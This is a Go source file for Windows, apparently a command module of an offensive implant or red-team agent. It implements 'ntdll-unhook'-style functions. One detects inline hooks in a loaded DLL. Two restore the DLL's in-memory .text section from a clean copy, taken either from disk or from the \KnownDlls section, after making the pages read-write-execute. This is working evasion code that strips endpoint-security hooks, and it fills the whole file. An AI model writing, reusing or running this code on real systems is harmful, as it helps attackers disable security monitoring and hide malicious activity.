//go:build windows
// +build windows

package commands

import (
	"fmt"
	"syscall"
	"unsafe"
)

func unhookDLL(dllName string) (string, error) {
	var output string
	output += fmt.Sprintf("[*] %s Unhooking\n", dllName)

	dllNameW, _ := syscall.UTF16PtrFromString(dllName)
	dllBase, _, _ := procGetModuleHandleW.Call(uintptr(unsafe.Pointer(dllNameW)))
	if dllBase == 0 {
		return output, fmt.Errorf("module %s not loaded", dllName)
	}
	output += fmt.Sprintf("[*] In-memory base: 0x%X\n", dllBase)

	dllPath, _ := syscall.UTF16PtrFromString(`C:\Windows\System32\` + dllName)
	hFile, _, err := procCreateFileW.Call(
		uintptr(unsafe.Pointer(dllPath)),
		uintptr(genericRead),
		uintptr(FILE_SHARE_READ),
		0,
		uintptr(openExisting),
		0,
		0,
	)
	invalidHandle := ^uintptr(0)
	if hFile == invalidHandle {
		return output, fmt.Errorf("CreateFileW failed: %w", err)
	}
	defer procCloseHandle.Call(hFile)

	hMapping, _, err := procCreateFileMappingW.Call(
		hFile,
		0,
		uintptr(pageReadonly|secImage),
		0,
		0,
		0,
	)
	if hMapping == 0 {
		return output, fmt.Errorf("CreateFileMappingW failed: %w", err)
	}
	defer procCloseHandle.Call(hMapping)

	mappedBase, _, err := procMapViewOfFile.Call(
		hMapping,
		uintptr(fileMapRead),
		0, 0, 0,
	)
	if mappedBase == 0 {
		return output, fmt.Errorf("MapViewOfFile failed: %w", err)
	}
	defer procUnmapViewOfFile.Call(mappedBase)
	output += fmt.Sprintf("[*] Clean copy mapped at: 0x%X\n", mappedBase)

	textSection, err := findTextSection(mappedBase)
	if err != nil {
		return output, fmt.Errorf("PE parsing failed: %w", err)
	}

	textVA := uintptr(textSection.VirtualAddress)
	textSize := uintptr(textSection.SizeOfRawData)
	output += fmt.Sprintf("[*] .text section: RVA=0x%X, Size=%d bytes\n", textVA, textSize)

	cleanTextAddr := mappedBase + textVA
	hookedTextAddr := dllBase + textVA

	var oldProtect uint32
	ret, _, err := procVirtualProtectUH.Call(
		hookedTextAddr,
		textSize,
		uintptr(PAGE_EXECUTE_READWRITE),
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret == 0 {
		return output, fmt.Errorf("memory protection change (RWX) failed: %w", err)
	}

	cleanSlice := unsafe.Slice((*byte)(unsafe.Pointer(cleanTextAddr)), textSize)
	hookedSlice := unsafe.Slice((*byte)(unsafe.Pointer(hookedTextAddr)), textSize)
	bytesCopied := copy(hookedSlice, cleanSlice)

	var discardProtect uint32
	procVirtualProtectUH.Call(
		hookedTextAddr,
		textSize,
		uintptr(oldProtect),
		uintptr(unsafe.Pointer(&discardProtect)),
	)

	output += fmt.Sprintf("[+] Restored %d bytes of .text section\n", bytesCopied)
	output += fmt.Sprintf("[+] %s successfully unhooked — all inline hooks removed\n", dllName)

	return output, nil
}

func checkDLLHooks(dllName string) (string, error) {
	var output string
	output += fmt.Sprintf("[*] Checking %s for inline hooks...\n", dllName)

	dllNameW, _ := syscall.UTF16PtrFromString(dllName)
	dllBase, _, _ := procGetModuleHandleW.Call(uintptr(unsafe.Pointer(dllNameW)))
	if dllBase == 0 {
		return output, fmt.Errorf("module %s not loaded", dllName)
	}

	dllPath, _ := syscall.UTF16PtrFromString(`C:\Windows\System32\` + dllName)
	hFile, _, err := procCreateFileW.Call(
		uintptr(unsafe.Pointer(dllPath)),
		uintptr(genericRead), uintptr(FILE_SHARE_READ), 0, uintptr(openExisting), 0, 0,
	)
	invalidHandle := ^uintptr(0)
	if hFile == invalidHandle {
		return output, fmt.Errorf("CreateFileW failed: %w", err)
	}
	defer procCloseHandle.Call(hFile)

	hMapping, _, err := procCreateFileMappingW.Call(hFile, 0, uintptr(pageReadonly|secImage), 0, 0, 0)
	if hMapping == 0 {
		return output, fmt.Errorf("CreateFileMappingW failed: %w", err)
	}
	defer procCloseHandle.Call(hMapping)

	mappedBase, _, err := procMapViewOfFile.Call(hMapping, uintptr(fileMapRead), 0, 0, 0)
	if mappedBase == 0 {
		return output, fmt.Errorf("MapViewOfFile failed: %w", err)
	}
	defer procUnmapViewOfFile.Call(mappedBase)

	textSection, err := findTextSection(mappedBase)
	if err != nil {
		return output, err
	}

	textVA := uintptr(textSection.VirtualAddress)
	textSize := uintptr(textSection.SizeOfRawData)

	cleanText := unsafe.Slice((*byte)(unsafe.Pointer(mappedBase+textVA)), textSize)
	hookedText := unsafe.Slice((*byte)(unsafe.Pointer(dllBase+textVA)), textSize)

	hookCount := 0
	var hooks []string
	const maxHooksToReport = 20

	i := uintptr(0)
	for i < textSize {
		if cleanText[i] != hookedText[i] {
			hookCount++
			hookStart := i
			for i < textSize && cleanText[i] != hookedText[i] {
				i++
			}
			hookLen := i - hookStart
			hookAddr := dllBase + textVA + hookStart

			if len(hooks) < maxHooksToReport {
				origBytes := make([]byte, minUintptr(hookLen, 8))
				hookBytes := make([]byte, minUintptr(hookLen, 8))
				copy(origBytes, cleanText[hookStart:])
				copy(hookBytes, hookedText[hookStart:])
				hooks = append(hooks, fmt.Sprintf("  0x%X (%d bytes): %X → %X",
					hookAddr, hookLen, origBytes, hookBytes))
			}
		} else {
			i++
		}
	}

	if hookCount == 0 {
		output += fmt.Sprintf("[+] No hooks detected — %s .text section matches disk copy\n", dllName)
		output += fmt.Sprintf("[*] Compared %d bytes\n", textSize)
	} else {
		output += fmt.Sprintf("[!] Found %d hooked regions in %s .text section (%d bytes)\n\n", hookCount, dllName, textSize)
		for _, h := range hooks {
			output += h + "\n"
		}
		if hookCount > maxHooksToReport {
			output += fmt.Sprintf("  ... and %d more\n", hookCount-maxHooksToReport)
		}
		output += fmt.Sprintf("\n[*] Run 'ntdll-unhook -dll %s' (action=unhook) to restore clean .text section\n", dllName)
	}

	return output, nil
}

func unhookDLLFromKnownDlls(dllName string) (string, error) {
	var output string
	output += fmt.Sprintf("[*] %s Unhooking (source: KnownDlls)\n", dllName)

	dllNameW, _ := syscall.UTF16PtrFromString(dllName)
	dllBase, _, _ := procGetModuleHandleW.Call(uintptr(unsafe.Pointer(dllNameW)))
	if dllBase == 0 {
		return output, fmt.Errorf("module %s not loaded", dllName)
	}
	output += fmt.Sprintf("[*] In-memory base: 0x%X\n", dllBase)

	sectionName := `\KnownDlls\` + dllName
	nameUTF16, _ := syscall.UTF16FromString(sectionName)
	us := UNICODE_STRING{
		Length:        uint16(len(sectionName) * 2),
		MaximumLength: uint16((len(sectionName) + 1) * 2),
		Buffer:        &nameUTF16[0],
	}

	var oa OBJECT_ATTRIBUTES
	oa.Length = uint32(unsafe.Sizeof(oa))
	oa.ObjectName = uintptr(unsafe.Pointer(&us))
	oa.Attributes = objCaseInsensitive

	var sectionHandle uintptr
	status, _, _ := procNtOpenSection.Call(
		uintptr(unsafe.Pointer(&sectionHandle)),
		uintptr(sectionMapRead),
		uintptr(unsafe.Pointer(&oa)),
	)
	if status != 0 {
		return output, fmt.Errorf("NtOpenSection failed (NTSTATUS: 0x%X) — %s may not be in KnownDlls", status, dllName)
	}
	defer procNtClose.Call(sectionHandle)

	var mappedBase uintptr
	var viewSize uintptr
	status, _, _ = procNtMapViewOfSection.Call(
		sectionHandle,
		^uintptr(0),
		uintptr(unsafe.Pointer(&mappedBase)),
		0,
		0,
		0,
		uintptr(unsafe.Pointer(&viewSize)),
		uintptr(viewUnmap),
		0,
		uintptr(pageReadonly),
	)
	if status != 0 {
		return output, fmt.Errorf("NtMapViewOfSection failed (NTSTATUS: 0x%X)", status)
	}
	defer procUnmapViewOfFile.Call(mappedBase)
	output += fmt.Sprintf("[*] KnownDlls section mapped at: 0x%X (no disk read)\n", mappedBase)

	textSection, err := findTextSection(mappedBase)
	if err != nil {
		return output, fmt.Errorf("PE parsing failed: %w", err)
	}

	textVA := uintptr(textSection.VirtualAddress)
	textSize := uintptr(textSection.SizeOfRawData)
	output += fmt.Sprintf("[*] .text section: RVA=0x%X, Size=%d bytes\n", textVA, textSize)

	cleanTextAddr := mappedBase + textVA
	hookedTextAddr := dllBase + textVA

	var oldProtect uint32
	ret, _, err2 := procVirtualProtectUH.Call(
		hookedTextAddr,
		textSize,
		uintptr(PAGE_EXECUTE_READWRITE),
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret == 0 {
		return output, fmt.Errorf("memory protection change (RWX) failed: %w", err2)
	}

	cleanSlice := unsafe.Slice((*byte)(unsafe.Pointer(cleanTextAddr)), textSize)
	hookedSlice := unsafe.Slice((*byte)(unsafe.Pointer(hookedTextAddr)), textSize)
	bytesCopied := copy(hookedSlice, cleanSlice)

	var discardProtect uint32
	procVirtualProtectUH.Call(
		hookedTextAddr,
		textSize,
		uintptr(oldProtect),
		uintptr(unsafe.Pointer(&discardProtect)),
	)

	output += fmt.Sprintf("[+] Restored %d bytes of .text section (from KnownDlls — no disk I/O)\n", bytesCopied)
	output += fmt.Sprintf("[+] %s successfully unhooked via KnownDlls section\n", dllName)

	return output, nil
}
